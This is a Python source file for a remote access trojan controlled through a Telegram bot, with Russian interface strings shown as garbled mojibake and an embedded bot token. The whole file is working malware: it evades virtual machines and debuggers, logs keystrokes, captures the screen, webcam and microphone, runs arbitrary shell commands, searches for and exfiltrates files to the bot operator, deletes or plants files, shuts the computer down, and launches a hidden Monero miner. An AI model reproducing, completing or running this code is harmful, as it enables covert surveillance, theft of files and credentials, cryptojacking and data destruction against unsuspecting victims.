import telebot
import pyautogui
import os
import cv2
import pyaudio
import wave
import subprocess
import threading
import time
import shutil
import psutil
import winreg
import sqlite3
import json
import zipfile
import re
import uuid
import numpy as np
import tempfile
import ctypes
from io import BytesIO
from pynput.keyboard import Listener

TOKEN = "8156943007:AAHMxlXVrE1oAEtogjSHtEHzyk4bqf_Iww8"
bot = telebot.TeleBot(TOKEN)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
is_recording = False
is_keylogging = False
is_streaming = False
is_mining = False
audio_thread = None
keylogger = None
stream_thread = None
miner_process = None
chat_id = None
temp_file_path = None
file_search_results = []
current_action = None  # –¢–µ–∫—É—â–µ–µ –¥–µ–π—Å—Ç–≤–∏–µ: 'steal' –∏–ª–∏ 'delete'

# ========================
# 1. –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò
# ========================

def is_vm_or_debugging():
    try:
        mac = ":".join(re.findall("..", hex(uuid.getnode())[2:].zfill(12)))
        if any(vm_mac in mac for vm_mac in ["00:1C:42", "00:0C:29", "08:00:27"]):
            return True

        blacklist_processes = ["wireshark", "procmon", "processhacker", "ollydbg"]
        for proc in psutil.process_iter():
            if proc.name().lower() in blacklist_processes:
                return True

        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools")
            return True
        except:
            pass

        return False
    except:
        return False

def self_destruct():
    try:
        os.remove(__file__)
        subprocess.call("taskkill /f /im python.exe", shell=True)
    except:
        pass

def clean_temp_files():
    temp_dir = 'temp_uploads'
    if os.path.exists(temp_dir):
        for file in os.listdir(temp_dir):
            try:
                os.remove(os.path.join(temp_dir, file))
            except:
                pass

def create_zip_with_file(file_path):
    """–°–æ–∑–¥–∞–µ—Ç –≤—Ä–µ–º–µ–Ω–Ω—ã–π ZIP-–∞—Ä—Ö–∏–≤ —Å —Ñ–∞–π–ª–æ–º"""
    zip_filename = tempfile.mktemp(suffix='.zip')
    
    try:
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(file_path, os.path.basename(file_path))
        return zip_filename
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∞—Ä—Ö–∏–≤–∞: {e}")
        return None

# ========================
# 2. –§–£–ù–ö–¶–ò–ò –†–ê–ë–û–¢–´ –° –§–ê–ô–õ–ê–ú–ò
# ========================

def search_files(filename):
    """–ü–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤ –ø–æ –∏–º–µ–Ω–∏"""
    results = []
    search_dirs = [
        os.path.expanduser("~"),
        os.path.join(os.getenv("APPDATA", "")),
        os.path.join(os.getenv("LOCALAPPDATA", "")),
        "C:\\"
    ]
    
    for directory in search_dirs:
        if not os.path.exists(directory):
            continue
            
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    if filename.lower() in file.lower():
                        try:
                            full_path = os.path.join(root, file)
                            results.append(full_path)
                        except:
                            continue
        except:
            continue
            
    return results

def steal_file(file_path):
    """–ö—Ä–∞–¥–µ—Ç —Ñ–∞–π–ª –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –≤ ZIP-–∞—Ä—Ö–∏–≤–µ"""
    try:
        if not os.path.exists(file_path):
            return False, "–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω"
            
        zip_path = create_zip_with_file(file_path)
        if not zip_path:
            return False, "–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∞—Ä—Ö–∏–≤–∞"
            
        with open(zip_path, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"üëú –£–∫—Ä–∞–¥–µ–Ω —Ñ–∞–π–ª: {os.path.basename(file_path)}")
            
        os.remove(zip_path)
        return True, "–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ —É–∫—Ä–∞–¥–µ–Ω"
    except Exception as e:
        return False, f"–û—à–∏–±–∫–∞: {str(e)}"

def delete_file(file_path):
    """–£–¥–∞–ª—è–µ—Ç —É–∫–∞–∑–∞–Ω–Ω—ã–π —Ñ–∞–π–ª"""
    try:
        if not os.path.exists(file_path):
            return False, "–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω"
            
        os.remove(file_path)
        return True, f"–§–∞–π–ª {file_path} —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω"
    except Exception as e:
        return False, f"–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è: {str(e)}"

# ========================
# 3. –û–°–ù–û–í–ù–´–ï –§–£–ù–ö–¶–ò–ò
# ========================

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    return screenshot_path

def capture_webcam():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        webcam_path = "webcam.jpg"
        cv2.imwrite(webcam_path, frame)
    cap.release()
    return webcam_path if ret else None

def record_audio():
    global is_recording
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNELS,
                       rate=RATE, input=True,
                       frames_per_buffer=CHUNK)
    frames = []
    
    while is_recording:
        data = stream.read(CHUNK)
        frames.append(data)
    
    stream.stop_stream()
    stream.close()
    audio.terminate()
    
    audio_path = "audio.wav"
    wf = wave.open(audio_path, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    return audio_path

def start_keylogger():
    global keylogger, is_keylogging
    is_keylogging = True
    keylogger = Listener(on_press=on_press)
    keylogger.start()

def stop_keylogger():
    global keylogger, is_keylogging
    if keylogger:
        keylogger.stop()
        is_keylogging = False

def on_press(key):
    with open("keylog.txt", "a", encoding="utf-8") as f:
        f.write(f"{key}\n")

def execute_cmd(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, encoding="cp866")
        return result[:4000]
    except subprocess.CalledProcessError as e:
        return f"–û—à–∏–±–∫–∞: {e.output}"

def close_active_window():
    try:
        pyautogui.hotkey('alt', 'f4')
        return "–ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ –∑–∞–∫—Ä—ã—Ç–æ."
    except Exception as e:
        return f"–û—à–∏–±–∫–∞: {e}"

def shutdown_pc():
    try:
        subprocess.call("shutdown /s /t 60", shell=True)
        return "–ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∏—Ç—Å—è —á–µ—Ä–µ–∑ 60 —Å–µ–∫—É–Ω–¥."
    except Exception as e:
        return f"–û—à–∏–±–∫–∞: {e}"

def stream_screen_hd():
    global is_streaming
    try:
        resolution = (1280, 720)
        fps = 30
        quality = 90
        
        cv2.namedWindow('HD Stream', cv2.WINDOW_NORMAL)
        cv2.resizeWindow('HD Stream', *resolution)
        
        while is_streaming:
            start_time = time.time()
            
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            
            frame = cv2.resize(frame, resolution)
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), quality])
            
            cv2.imshow('HD Stream', frame)
            if cv2.waitKey(1) == 27:
                break
                
            elapsed = time.time() - start_time
            delay = max(0, 1/fps - elapsed)
            time.sleep(delay)
            
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å—Ç—Ä–∏–º–∞: {e}")
    finally:
        cv2.destroyAllWindows()

def start_miner():
    global miner_process, is_mining
    if not is_mining:
        miner_url = "gulf.moneroocean.stream:10128"
        wallet = "YOUR_XMR_WALLET"
        try:
            miner_process = subprocess.Popen(
                f"xmrig.exe -o {miner_url} -u {wallet} --cpu-max-threads-hint=50 --randomx-mode=fast",
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            is_mining = True
            markup = telebot.types.InlineKeyboardMarkup()
            markup.add(telebot.types.InlineKeyboardButton("üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –º–∞–π–Ω–∏–Ω–≥", callback_data="stop_mining"))
            return "‚õè –ú–∞–π–Ω–∏–Ω–≥ Monero –∑–∞–ø—É—â–µ–Ω (CPU).", markup
        except Exception as e:
            return f"–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –º–∞–π–Ω–µ—Ä–∞: {str(e)}", None
    return "–ú–∞–π–Ω–∏–Ω–≥ —É–∂–µ –∑–∞–ø—É—â–µ–Ω.", None

def stop_miner():
    global miner_process, is_mining
    if is_mining and miner_process:
        miner_process.terminate()
        is_mining = False
        return "–ú–∞–π–Ω–∏–Ω–≥ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω."
    return "–ú–∞–π–Ω–∏–Ω–≥ –Ω–µ –±—ã–ª –∑–∞–ø—É—â–µ–Ω."

# ========================
# 4. –ò–ù–¢–ï–†–§–ï–ô–° –ò –ö–û–ú–ê–ù–î–´
# ========================

def create_main_keyboard():
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç", "üì∑ –í–µ–±–∫–∞–º–µ—Ä–∞",
        "üé§ –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞", "‚å®Ô∏è –ö–µ–π–ª–æ–≥–≥–µ—Ä",
        "üìπ HD –°—Ç—Ä–∏–º–∏–Ω–≥", "üíª CMD",
        "‚ùå –ó–∞–∫—Ä—ã—Ç—å –æ–∫–Ω–æ", "üî¥ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö",
        "üí∞ –ú–∞–π–Ω–∏–Ω–≥", "üìÇ –£–∫—Ä–∞—Å—Ç—å —Ñ–∞–π–ª",
        "üóë –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª", "üìÅ –î–æ–±–∞–≤–∏—Ç—å —Ñ–∞–π–ª",
        "üí¨ –í—ã–≤–µ—Å—Ç–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ"
    ]
    markup.add(*[telebot.types.KeyboardButton(btn) for btn in buttons])
    return markup

def create_skip_keyboard():
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–æ–∏—Å–∫", callback_data="skip_search"))
    return markup

def create_stop_keyboard():
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å", callback_data="stop_action"))
    return markup

# ========================
# 5. –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –°–û–û–ë–©–ï–ù–ò–ô
# ========================

@bot.message_handler(commands=['start'])
def start_handler(message):
    global chat_id
    chat_id = message.chat.id
    
    if is_vm_or_debugging():
        self_destruct()
    else:
        bot.send_message(chat_id, "‚úÖ –ë–æ—Ç –∞–∫—Ç–∏–≤–µ–Ω (Sandbox –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω).", reply_markup=create_main_keyboard())

@bot.message_handler(content_types=['document', 'photo'])
def handle_document(message):
    global temp_file_path
    try:
        temp_dir = 'temp_uploads'
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        
        if message.content_type == 'document':
            file_info = bot.get_file(message.document.file_id)
            file_name = message.document.file_name
            file_data = bot.download_file(file_info.file_path)
        elif message.content_type == 'photo':
            file_info = bot.get_file(message.photo[-1].file_id)
            file_name = f"photo_{file_info.file_id}.jpg"
            file_data = bot.download_file(file_info.file_path)
        
        temp_file_path = os.path.join(temp_dir, file_name)
        
        with open(temp_file_path, 'wb') as f:
            f.write(file_data)
        
        file_size = os.path.getsize(temp_file_path) / 1024
        bot.send_message(
            message.chat.id,
            f"‚úÖ –§–∞–π–ª '{file_name}' —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω ({file_size:.2f} KB).\n"
            "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä: C:\\folder\\file.txt)"
        )
        
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞: {str(e)}")
        if temp_file_path and os.path.exists(temp_file_path):
            os.remove(temp_file_path)

@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    global is_recording, is_keylogging, is_streaming, is_mining, temp_file_path, current_action
    
    try:
        if message.text == "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç":
            bot.send_photo(message.chat.id, open(take_screenshot(), 'rb'))
            os.remove("screenshot.png")

        elif message.text == "üì∑ –í–µ–±–∫–∞–º–µ—Ä–∞":
            webcam_path = capture_webcam()
            if webcam_path:
                bot.send_photo(message.chat.id, open(webcam_path, 'rb'))
                os.remove(webcam_path)
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å –∫–∞–º–µ—Ä—ã.")

        elif message.text == "üé§ –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞":
            is_recording = True
            audio_thread = threading.Thread(target=lambda: bot.send_audio(message.chat.id, open(record_audio(), 'rb')))
            audio_thread.start()
            bot.send_message(message.chat.id, "–ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞ –Ω–∞—á–∞—Ç–∞...", reply_markup=create_stop_keyboard())

        elif message.text == "‚å®Ô∏è –ö–µ–π–ª–æ–≥–≥–µ—Ä":
            start_keylogger()
            bot.send_message(message.chat.id, "–ö–µ–π–ª–æ–≥–≥–µ—Ä –∑–∞–ø—É—â–µ–Ω...", reply_markup=create_stop_keyboard())

        elif message.text == "üìπ HD –°—Ç—Ä–∏–º–∏–Ω–≥":
            is_streaming = True
            stream_thread = threading.Thread(target=stream_screen_hd)
            stream_thread.start()
            bot.send_message(message.chat.id, "üåÄ HD —Å—Ç—Ä–∏–º–∏–Ω–≥ –∑–∞–ø—É—â–µ–Ω (ESC –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏)")

        elif message.text == "üíª CMD":
            msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏ –∫–æ–º–∞–Ω–¥—É:")
            bot.register_next_step_handler(msg, process_cmd)

        elif message.text == "‚ùå –ó–∞–∫—Ä—ã—Ç—å –æ–∫–Ω–æ":
            bot.send_message(message.chat.id, close_active_window())

        elif message.text == "üî¥ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö":
            bot.send_message(message.chat.id, shutdown_pc())

        elif message.text == "üí∞ –ú–∞–π–Ω–∏–Ω–≥":
            response, markup = start_miner()
            if markup:
                bot.send_message(message.chat.id, response, reply_markup=markup)
            else:
                bot.send_message(message.chat.id, response)

        elif message.text == "üìÇ –£–∫—Ä–∞—Å—Ç—å —Ñ–∞–π–ª":
            current_action = 'steal'
            msg = bot.send_message(message.chat.id, 
                                 "–í–≤–µ–¥–∏—Ç–µ –∏–º—è —Ñ–∞–π–ª–∞ –¥–ª—è –ø–æ–∏—Å–∫–∞ –∏–ª–∏ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å:\n"
                                 "(–Ω–∞–ø—Ä–∏–º–µ—Ä: 'passwords.txt' –∏–ª–∏ 'C:\\Users\\Admin\\file.txt')",
                                 reply_markup=create_skip_keyboard())
            bot.register_next_step_handler(msg, process_file_search)

        elif message.text == "üóë –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª":
            current_action = 'delete'
            msg = bot.send_message(message.chat.id, 
                                 "–í–≤–µ–¥–∏—Ç–µ –∏–º—è —Ñ–∞–π–ª–∞ –¥–ª—è –ø–æ–∏—Å–∫–∞ –∏–ª–∏ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å:\n"
                                 "(–Ω–∞–ø—Ä–∏–º–µ—Ä: 'temp.txt' –∏–ª–∏ 'C:\\Windows\\temp.txt')",
                                 reply_markup=create_skip_keyboard())
            bot.register_next_step_handler(msg, process_file_search)

        elif message.text == "üìÅ –î–æ–±–∞–≤–∏—Ç—å —Ñ–∞–π–ª":
            bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –∏–ª–∏ —Ñ–æ—Ç–æ, –∫–æ—Ç–æ—Ä–æ–µ –Ω—É–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä –∂–µ—Ä—Ç–≤—ã")
            temp_file_path = None

        elif message.text == "üí¨ –í—ã–≤–µ—Å—Ç–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ":
            msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –Ω—É–∂–Ω–æ –ø–æ–∫–∞–∑–∞—Ç—å –Ω–∞ —ç–∫—Ä–∞–Ω–µ:")
            bot.register_next_step_handler(msg, process_popup_message)

        elif temp_file_path and os.path.exists(temp_file_path):
            try:
                destination = message.text.strip()
                os.makedirs(os.path.dirname(destination), exist_ok=True)
                shutil.copy2(temp_file_path, destination)
                bot.send_message(message.chat.id, f"‚úÖ –§–∞–π–ª —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω –∫–∞–∫ {destination}")
                os.remove(temp_file_path)
                temp_file_path = None
            except Exception as e:
                bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–∞: {str(e)}")
                if os.path.exists(temp_file_path):
                    os.remove(temp_file_path)
                temp_file_path = None

    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}")

def process_file_search(message):
    global current_action
    
    if message.text == "–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–æ–∏—Å–∫":
        if current_action == 'steal':
            msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ —É–∫—Ä–∞—Å—Ç—å:")
            bot.register_next_step_handler(msg, process_steal_file)
        else:
            msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è:")
            bot.register_next_step_handler(msg, process_file_deletion)
        return
    
    search_results = search_files(message.text)
    
    if search_results:
        response = "üîç –ù–∞–π–¥–µ–Ω—ã —Ñ–∞–π–ª—ã:\n" + "\n".join(f"üìÑ {f}" for f in search_results[:20])
        
        if current_action == 'steal':
            msg = bot.send_message(message.chat.id, response + "\n\n–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ –Ω—É–∂–Ω–æ–º—É —Ñ–∞–π–ª—É:")
            bot.register_next_step_handler(msg, process_steal_file)
        else:
            msg = bot.send_message(message.chat.id, response + "\n\n–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è:")
            bot.register_next_step_handler(msg, process_file_deletion)
    else:
        if current_action == 'steal':
            msg = bot.send_message(message.chat.id, "–§–∞–π–ª—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã. –í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –≤—Ä—É—á–Ω—É—é:")
            bot.register_next_step_handler(msg, process_steal_file)
        else:
            msg = bot.send_message(message.chat.id, "–§–∞–π–ª—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã. –í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –≤—Ä—É—á–Ω—É—é:")
            bot.register_next_step_handler(msg, process_file_deletion)

def process_steal_file(message):
    file_path = message.text.strip()
    success, result = steal_file(file_path)
    if success:
        bot.send_message(message.chat.id, f"‚úÖ {result}")
    else:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è {result}")

def process_file_deletion(message):
    file_path = message.text.strip()
    success, result = delete_file(file_path)
    if success:
        bot.send_message(message.chat.id, f"‚úÖ {result}")
    else:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è {result}")

def process_popup_message(message):
    try:
        with tempfile.NamedTemporaryFile(suffix='.vbs', delete=False, mode='w', encoding='utf-8') as f:
            f.write(f'MsgBox "{message.text}", vbInformation, "–°–æ–æ–±—â–µ–Ω–∏–µ"')
            vbs_path = f.name
        
        subprocess.Popen(['wscript.exe', vbs_path], shell=True)
        time.sleep(2)
        os.remove(vbs_path)
        bot.send_message(message.chat.id, "‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∞ —ç–∫—Ä–∞–Ω–µ")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–≤–æ–¥–µ —Å–æ–æ–±—â–µ–Ω–∏—è: {str(e)}")

def process_cmd(message):
    cmd = message.text.strip()
    if cmd.lower() in ("shutdown", "format", "rm -rf"):
        bot.send_message(message.chat.id, "‚ùå –ö–æ–º–∞–Ω–¥–∞ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞.")
    else:
        result = execute_cmd(cmd)
        bot.send_message(message.chat.id, f"–†–µ–∑—É–ª—å—Ç–∞—Ç:\n```\n{result}\n```", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data in ["stop_action", "stop_mining", "skip_search"])
def handle_callbacks(call):
    global current_action
    
    if call.data == "stop_action":
        global is_recording, is_keylogging
        
        if is_recording:
            is_recording = False
            if audio_thread:
                audio_thread.join()
            if os.path.exists("audio.wav"):
                os.remove("audio.wav")
            bot.send_message(call.message.chat.id, "–ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞.")
        
        elif is_keylogging:
            stop_keylogger()
            if os.path.exists("keylog.txt"):
                with open("keylog.txt", 'rb') as f:
                    bot.send_document(call.message.chat.id, f)
                os.remove("keylog.txt")
            else:
                bot.send_message(call.message.chat.id, "–õ–æ–≥ –ø—É—Å—Ç.")
    
    elif call.data == "stop_mining":
        response = stop_miner()
        bot.send_message(call.message.chat.id, response)
    
    elif call.data == "skip_search":
        if current_action == 'steal':
            msg = bot.send_message(call.message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ —É–∫—Ä–∞—Å—Ç—å:")
            bot.register_next_step_handler(msg, process_steal_file)
        else:
            msg = bot.send_message(call.message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è:")
            bot.register_next_step_handler(msg, process_file_deletion)
    
    bot.answer_callback_query(call.id)

if __name__ == "__main__":
    if not is_vm_or_debugging():
        print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω...")
        clean_temp_files()
        bot.polling()
    else:
        self_destruct()
